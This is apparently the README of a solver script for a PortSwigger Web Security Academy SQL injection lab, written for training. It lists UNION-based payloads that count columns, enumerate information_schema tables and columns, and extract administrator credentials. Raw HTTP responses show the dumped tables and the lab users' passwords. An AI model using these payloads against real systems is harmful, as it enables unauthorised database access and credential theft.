# 🔐 SQL injection attack, listing the database contents on non-Oracle databases

This script is designed to test for basic SQL injection vulnerabilities in labs from PortSwigger's Web Security Academy Lab: [SQL injection attack, listing the database contents on non-Oracle databases](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-examining-the-database-in-sql-injection-attacks/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle). It targets endpoints like `/filter?category=` and checks whether a given payload successfully bypasses input validation.

---

## 🚀 How It Works

The script performs the following steps:

1. **Disables SSL warnings** to avoid certificate issues with lab URLs.
2. **Sets up a proxy** (default: `127.0.0.1:8080`) for interception via tools like Burp Suite.
3. **Accepts two arguments**:
   - `url`: The base URL of the lab.
   - `table`: Name of a separate table that needs be used during UNION SQL Injection.
   - `columns`: A list of columns can be passed by the user separated by space.
4. **Constructs the full request URL** by appending the payload to `/filter?category=`.
5. **Sends the request** and use beautiful soup library to fetch the password for administrator
6. **Prints the result** indicating whether the injection was successful.

---

## 🧪 Sample Usage

```bash
python3 unionRetrieveDbInfoAccessOtherTables.py https://0a60006a040ad30880e9127c00990061.web-security-academy.net
```

### ✅ Sample Output

```
(+) Targeting: https://0a60006a040ad30880e9127c00990061.web-security-academy.net

(+) Determining number of columns using ORDER BY...

    ➤ Testing payload: ' ORDER BY 1--
    ➤ Testing payload: ' ORDER BY 2--
    ➤ Testing payload: ' ORDER BY 3--

(✓) Found error at column 3, so total columns = 2

(+) Identifying string-compatible columns...

    ➤ Testing column 1 with payload: ' UNION SELECT 'test123',null--
    ✓ Column 1 accepts string data.

    ➤ Testing column 2 with payload: ' UNION SELECT null,'test123'--
    ✓ Column 2 accepts string data.

(+) Searching for users table...

    ➤ Sending payload: ' UNION SELECT table_name,null FROM information_schema.tables--
(✓) Found users table: users_vmtenw

(+) Searching for columns in table 'users_vmtenw'...

    ➤ Sending payload: ' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name = 'users_vmtenw'--
(✓) Found columns: username_hcobyb, password_gzfrxq

(+) Extracting administrator password from 'users_vmtenw'...

    ➤ Sending payload: ' UNION SELECT username_hcobyb,password_gzfrxq FROM users_vmtenw--
(✓) Administrator password: zwc0c28fblmq0zvx32mm
```

---

## 📌 Lab-Specific Note

For this particular lab, the script checks whether the response contains the administrator password in a particular html tag using web scraping to determine success. You can modify this logic in the code to match other labs or contexts.

---

## 📦 Requirements

Install dependencies using:

```bash
pip install -r requirements.txt
```

---

## 📦 Walkthrough of the code
[Code Walkthrough](https://medium.com/@adhithyasivanesh/portswigger-web-security-academy-labs-sqli-lab-1-retrieving-hidden-data-fe40ea356d5d)

## Sample HTML response which was scrapped (Output 1 for table name)

```HTML
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: session=K3m4SAk3ifR5NJYrTkZOR4mtVjhQNEQg; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 24101

<!DOCTYPE html>
<html>
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <title>SQL injection attack, listing the database contents on non-Oracle databases</title>
    </head>
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>SQL injection attack, listing the database contents on non-Oracle databases</h2>
                            <a id='lab-link' class='button' href='/'>Back to lab home</a>
                            <a class=link-back href='https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <div theme="ecommerce">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="ecoms-pageheader">
                        <img src="/resources/images/shop.svg">
                    </section>
                    <section class="ecoms-pageheader">
                        <h1>Accessories&apos; UNION SELECT table_name,null FROM information_schema.tables--</h1>
                    </section>
                    <section class="search-filters">
                        <label>Refine your search:</label>
                        <a class="filter-category" href="/">All</a>
                        <a class="filter-category" href="/filter?category=Clothing%2c+shoes+and+accessories">Clothing, shoes and accessories</a>
                        <a class="filter-category" href="/filter?category=Corporate+gifts">Corporate gifts</a>
                        <a class="filter-category" href="/filter?category=Lifestyle">Lifestyle</a>
                        <a class="filter-category" href="/filter?category=Pets">Pets</a>
                        <a class="filter-category" href="/filter?category=Tech+gifts">Tech gifts</a>
                    </section>
                    <table class="is-table-longdescription">
                        <tbody>
                        <tr>
                            <th>pg_partitioned_table</th>
                        </tr>
                        <tr>
                            <th>pg_available_extension_versions</th>
                        </tr>
                        <tr>
                            <th>pg_shdescription</th>
                        </tr>
                        <tr>
                            <th>user_defined_types</th>
                        </tr>
                        <tr>
                            <th>udt_privileges</th>
                        </tr>
                        <tr>
                            <th>sql_packages</th>
                        </tr>
                        <tr>
                            <th>pg_event_trigger</th>
                        </tr>
                        <tr>
                            <th>pg_amop</th>
                        </tr>
                        <tr>
                            <th>schemata</th>
                        </tr>
                        <tr>
                            <th>routines</th>
                        </tr>
                        <tr>
                            <th>referential_constraints</th>
                        </tr>
                        <tr>
                            <th>administrable_role_authorizations</th>
                        </tr>
                        <tr>
                            <th>products</th>
                        </tr>
                        <tr>
                            <th>pg_foreign_data_wrapper</th>
                        </tr>
                        <tr>
                            <th>pg_prepared_statements</th>
                        </tr>
                        <tr>
                            <th>pg_largeobject_metadata</th>
                        </tr>
                        <tr>
                            <th>foreign_tables</th>
                        </tr>
                        <tr>
                            <th>sql_implementation_info</th>
                        </tr>
                        <tr>
                            <th>collation_character_set_applicability</th>
                        </tr>
                        <tr>
                            <th>check_constraint_routine_usage</th>
                        </tr>
                        <tr>
                            <th>pg_statio_user_sequences</th>
                        </tr>
                        <tr>
                            <th>pg_cast</th>
                        </tr>
                        <tr>
                            <th>pg_user_mappings</th>
                        </tr>
                        <tr>
                            <th>pg_statio_all_tables</th>
                        </tr>
                        <tr>
                            <th>pg_stat_progress_vacuum</th>
                        </tr>
                        <tr>
                            <th>pg_statio_sys_sequences</th>
                        </tr>
                        <tr>
                            <th>pg_inherits</th>
                        </tr>
                        <tr>
                            <th>pg_stat_xact_all_tables</th>
                        </tr>
                        <tr>
                            <th>column_options</th>
                        </tr>
                        <tr>
                            <th>foreign_servers</th>
                        </tr>
                        <tr>
                            <th>sql_features</th>
                        </tr>
                        <tr>
                            <th>pg_stat_wal_receiver</th>
                        </tr>
                        <tr>
                            <th>pg_pltemplate</th>
                        </tr>
                        <tr>
                            <th>constraint_table_usage</th>
                        </tr>
                        <tr>
                            <th>pg_ts_parser</th>
                        </tr>
                        <tr>
                            <th>parameters</th>
                        </tr>
                        <tr>
                            <th>pg_stat_activity</th>
                        </tr>
                        <tr>
                            <th>pg_ts_template</th>
                        </tr>
                        <tr>
                            <th>element_types</th>
                        </tr>
                        <tr>
                            <th>pg_stat_subscription</th>
                        </tr>
                        <tr>
                            <th>pg_stat_all_tables</th>
                        </tr>
                        <tr>
                            <th>pg_locks</th>
                        </tr>
                        <tr>
                            <th>pg_seclabel</th>
                        </tr>
                        <tr>
                            <th>pg_ts_config</th>
                        </tr>
                        <tr>
                            <th>pg_stat_archiver</th>
                        </tr>
                        <tr>
                            <th>pg_stat_ssl</th>
                        </tr>
                        <tr>
                            <th>role_udt_grants</th>
                        </tr>
                        <tr>
                            <th>pg_stat_xact_user_functions</th>
                        </tr>
                        <tr>
                            <th>pg_am</th>
                        </tr>
                        <tr>
                            <th>domain_udt_usage</th>
                        </tr>
                        <tr>
                            <th>column_privileges</th>
                        </tr>
                        <tr>
                            <th>pg_policy</th>
                        </tr>
                        <tr>
                            <th>pg_timezone_names</th>
                        </tr>
                        <tr>
                            <th>domains</th>
                        </tr>
                        <tr>
                            <th>pg_amproc</th>
                        </tr>
                        <tr>
                            <th>pg_replication_origin</th>
                        </tr>
                        <tr>
                            <th>information_schema_catalog_name</th>
                        </tr>
                        <tr>
                            <th>pg_ts_dict</th>
                        </tr>
                        <tr>
                            <th>character_sets</th>
                        </tr>
                        <tr>
                            <th>pg_db_role_setting</th>
                        </tr>
                        <tr>
                            <th>pg_publication</th>
                        </tr>
                        <tr>
                            <th>pg_stat_xact_sys_tables</th>
                        </tr>
                        <tr>
                            <th>foreign_data_wrappers</th>
                        </tr>
                        <tr>
                            <th>routine_privileges</th>
                        </tr>
                        <tr>
                            <th>pg_views</th>
                        </tr>
                        <tr>
                            <th>pg_foreign_table</th>
                        </tr>
                        <tr>
                            <th>pg_statio_sys_indexes</th>
                        </tr>
                        <tr>
                            <th>pg_database</th>
                        </tr>
                        <tr>
                            <th>user_mappings</th>
                        </tr>
                        <tr>
                            <th>pg_class</th>
                        </tr>
                        <tr>
                            <th>pg_foreign_server</th>
                        </tr>
                        <tr>
                            <th>pg_type</th>
                        </tr>
                        <tr>
                            <th>view_column_usage</th>
                        </tr>
                        <tr>
                            <th>applicable_roles</th>
                        </tr>
                        <tr>
                            <th>pg_group</th>
                        </tr>
                        <tr>
                            <th>views</th>
                        </tr>
                        <tr>
                            <th>domain_constraints</th>
                        </tr>
                        <tr>
                            <th>pg_stat_user_tables</th>
                        </tr>
                        <tr>
                            <th>view_table_usage</th>
                        </tr>
                        <tr>
                            <th>pg_transform</th>
                        </tr>
                        <tr>
                            <th>pg_stat_sys_indexes</th>
                        </tr>
                        <tr>
                            <th>role_routine_grants</th>
                        </tr>
                        <tr>
                            <th>role_column_grants</th>
                        </tr>
                        <tr>
                            <th>user_mapping_options</th>
                        </tr>
                        <tr>
                            <th>pg_aggregate</th>
                        </tr>
                        <tr>
                            <th>pg_stat_database_conflicts</th>
                        </tr>
                        <tr>
                            <th>pg_stat_database</th>
                        </tr>
                        <tr>
                            <th>sql_sizing</th>
                        </tr>
                        <tr>
                            <th>triggers</th>
                        </tr>
                        <tr>
                            <th>triggered_update_columns</th>
                        </tr>
                        <tr>
                            <th>pg_tables</th>
                        </tr>
                        <tr>
                            <th>usage_privileges</th>
                        </tr>
                        <tr>
                            <th>foreign_table_options</th>
                        </tr>
                        <tr>
                            <th>pg_index</th>
                        </tr>
                        <tr>
                            <th>pg_prepared_xacts</th>
                        </tr>
                        <tr>
                            <th>pg_description</th>
                        </tr>
                        <tr>
                            <th>pg_auth_members</th>
                        </tr>
                        <tr>
                            <th>pg_statistic_ext</th>
                        </tr>
                        <tr>
                            <th>pg_cursors</th>
                        </tr>
                        <tr>
                            <th>pg_statio_all_sequences</th>
                        </tr>
                        <tr>
                            <th>pg_stat_replication</th>
                        </tr>
                        <tr>
                            <th>pg_settings</th>
                        </tr>
                        <tr>
                            <th>role_table_grants</th>
                        </tr>
                        <tr>
                            <th>pg_statio_all_indexes</th>
                        </tr>
                        <tr>
                            <th>pg_depend</th>
                        </tr>
                        <tr>
                            <th>pg_subscription</th>
                        </tr>
                        <tr>
                            <th>pg_subscription_rel</th>
                        </tr>
                        <tr>
                            <th>columns</th>
                        </tr>
                        <tr>
                            <th>pg_stat_xact_user_tables</th>
                        </tr>
                        <tr>
                            <th>pg_stat_progress_cluster</th>
                        </tr>
                        <tr>
                            <th>sequences</th>
                        </tr>
                        <tr>
                            <th>pg_stats</th>
                        </tr>
                        <tr>
                            <th>pg_seclabels</th>
                        </tr>
                        <tr>
                            <th>pg_attribute</th>
                        </tr>
                        <tr>
                            <th>check_constraints</th>
                        </tr>
                        <tr>
                            <th>pg_rules</th>
                        </tr>
                        <tr>
                            <th>pg_timezone_abbrevs</th>
                        </tr>
                        <tr>
                            <th>pg_default_acl</th>
                        </tr>
                        <tr>
                            <th>pg_stat_gssapi</th>
                        </tr>
                        <tr>
                            <th>pg_stat_sys_tables</th>
                        </tr>
                        <tr>
                            <th>pg_shseclabel</th>
                        </tr>
                        <tr>
                            <th>pg_opclass</th>
                        </tr>
                        <tr>
                            <th>pg_stat_bgwriter</th>
                        </tr>
                        <tr>
                            <th>pg_sequence</th>
                        </tr>
                        <tr>
                            <th>foreign_server_options</th>
                        </tr>
                        <tr>
                            <th>constraint_column_usage</th>
                        </tr>
                        <tr>
                            <th>pg_operator</th>
                        </tr>
                        <tr>
                            <th>pg_extension</th>
                        </tr>
                        <tr>
                            <th>view_routine_usage</th>
                        </tr>
                        <tr>
                            <th>pg_indexes</th>
                        </tr>
                        <tr>
                            <th>pg_replication_slots</th>
                        </tr>
                        <tr>
                            <th>pg_roles</th>
                        </tr>
                        <tr>
                            <th>enabled_roles</th>
                        </tr>
                        <tr>
                            <th>data_type_privileges</th>
                        </tr>
                        <tr>
                            <th>key_column_usage</th>
                        </tr>
                        <tr>
                            <th>pg_sequences</th>
                        </tr>
                        <tr>
                            <th>pg_rewrite</th>
                        </tr>
                        <tr>
                            <th>pg_statio_user_tables</th>
                        </tr>
                        <tr>
                            <th>pg_attrdef</th>
                        </tr>
                        <tr>
                            <th>sql_languages</th>
                        </tr>
                        <tr>
                            <th>pg_tablespace</th>
                        </tr>
                        <tr>
                            <th>pg_stat_all_indexes</th>
                        </tr>
                        <tr>
                            <th>attributes</th>
                        </tr>
                        <tr>
                            <th>pg_language</th>
                        </tr>
                        <tr>
                            <th>pg_opfamily</th>
                        </tr>
                        <tr>
                            <th>pg_publication_rel</th>
                        </tr>
                        <tr>
                            <th>pg_ts_config_map</th>
                        </tr>
                        <tr>
                            <th>pg_statio_sys_tables</th>
                        </tr>
                        <tr>
                            <th>pg_shdepend</th>
                        </tr>
                        <tr>
                            <th>table_constraints</th>
                        </tr>
                        <tr>
                            <th>pg_matviews</th>
                        </tr>
                        <tr>
                            <th>sql_sizing_profiles</th>
                        </tr>
                        <tr>
                            <th>pg_collation</th>
                        </tr>
                        <tr>
                            <th>users_vmtenw</th>
                        </tr>
                        <tr>
                            <th>collations</th>
                        </tr>
                        <tr>
                            <th>table_privileges</th>
                        </tr>
                        <tr>
                            <th>pg_stats_ext</th>
                        </tr>
                        <tr>
                            <th>column_domain_usage</th>
                        </tr>
                        <tr>
                            <th>pg_stat_user_indexes</th>
                        </tr>
                        <tr>
                            <th>pg_publication_tables</th>
                        </tr>
                        <tr>
                            <th>pg_proc</th>
                        </tr>
                        <tr>
                            <th>pg_statio_user_indexes</th>
                        </tr>
                        <tr>
                            <th>pg_available_extensions</th>
                        </tr>
                        <tr>
                            <th>tables</th>
                        </tr>
                        <tr>
                            <th>role_usage_grants</th>
                        </tr>
                        <tr>
                            <th>pg_init_privs</th>
                        </tr>
                        <tr>
                            <th>pg_range</th>
                        </tr>
                        <tr>
                            <th>pg_namespace</th>
                        </tr>
                        <tr>
                            <th>pg_trigger</th>
                        </tr>
                        <tr>
                            <th>column_udt_usage</th>
                        </tr>
                        <tr>
                            <th>pg_enum</th>
                        </tr>
                        <tr>
                            <th>pg_policies</th>
                        </tr>
                        <tr>
                            <th>pg_user</th>
                        </tr>
                        <tr>
                            <th>column_column_usage</th>
                        </tr>
                        <tr>
                            <th>pg_stat_progress_create_index</th>
                        </tr>
                        <tr>
                            <th>pg_constraint</th>
                        </tr>
                        <tr>
                            <th>pg_stat_user_functions</th>
                        </tr>
                        <tr>
                            <th>pg_conversion</th>
                        </tr>
                        <tr>
                            <th>foreign_data_wrapper_options</th>
                        </tr>
                        </tbody>
                    </table>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```

## Sample HTML response which was scrapped (Output 2 for column name)

```HTML
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: session=ZGdgy1iCzoyKNsGzljeggq2WBFStc0OB; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 4328

<!DOCTYPE html>
<html>
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <title>SQL injection attack, listing the database contents on non-Oracle databases</title>
    </head>
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>SQL injection attack, listing the database contents on non-Oracle databases</h2>
                            <a id='lab-link' class='button' href='/'>Back to lab home</a>
                            <a class=link-back href='https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <div theme="ecommerce">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="ecoms-pageheader">
                        <img src="/resources/images/shop.svg">
                    </section>
                    <section class="ecoms-pageheader">
                        <h1>Accessories&apos; UNION SELECT column_name,null FROM information_schema.columns WHERE table_name = &apos;users_vmtenw&apos;--</h1>
                    </section>
                    <section class="search-filters">
                        <label>Refine your search:</label>
                        <a class="filter-category" href="/">All</a>
                        <a class="filter-category" href="/filter?category=Clothing%2c+shoes+and+accessories">Clothing, shoes and accessories</a>
                        <a class="filter-category" href="/filter?category=Corporate+gifts">Corporate gifts</a>
                        <a class="filter-category" href="/filter?category=Lifestyle">Lifestyle</a>
                        <a class="filter-category" href="/filter?category=Pets">Pets</a>
                        <a class="filter-category" href="/filter?category=Tech+gifts">Tech gifts</a>
                    </section>
                    <table class="is-table-longdescription">
                        <tbody>
                        <tr>
                            <th>email</th>
                        </tr>
                        <tr>
                            <th>password_gzfrxq</th>
                        </tr>
                        <tr>
                            <th>username_hcobyb</th>
                        </tr>
                        </tbody>
                    </table>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>

```

## Sample HTML response which was scrapped (Output 3 for username and password)

```HTML
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: session=1YD53SHnRssjlzCIXlWRTflCN8fW46ez; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 4449

<!DOCTYPE html>
<html>
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <title>SQL injection attack, listing the database contents on non-Oracle databases</title>
    </head>
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>SQL injection attack, listing the database contents on non-Oracle databases</h2>
                            <a id='lab-link' class='button' href='/'>Back to lab home</a>
                            <a class=link-back href='https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <div theme="ecommerce">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="ecoms-pageheader">
                        <img src="/resources/images/shop.svg">
                    </section>
                    <section class="ecoms-pageheader">
                        <h1>Accessories&apos; UNION SELECT username_hcobyb,password_gzfrxq FROM users_vmtenw--</h1>
                    </section>
                    <section class="search-filters">
                        <label>Refine your search:</label>
                        <a class="filter-category" href="/">All</a>
                        <a class="filter-category" href="/filter?category=Clothing%2c+shoes+and+accessories">Clothing, shoes and accessories</a>
                        <a class="filter-category" href="/filter?category=Corporate+gifts">Corporate gifts</a>
                        <a class="filter-category" href="/filter?category=Lifestyle">Lifestyle</a>
                        <a class="filter-category" href="/filter?category=Pets">Pets</a>
                        <a class="filter-category" href="/filter?category=Tech+gifts">Tech gifts</a>
                    </section>
                    <table class="is-table-longdescription">
                        <tbody>
                        <tr>
                            <th>administrator</th>
                            <td>zwc0c28fblmq0zvx32mm</td>
                        </tr>
                        <tr>
                            <th>wiener</th>
                            <td>elun05p7ly6vyy1twkvk</td>
                        </tr>
                        <tr>
                            <th>carlos</th>
                            <td>5nzkn3dzic8sa48q4dnj</td>
                        </tr>
                        </tbody>
                    </table>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>

```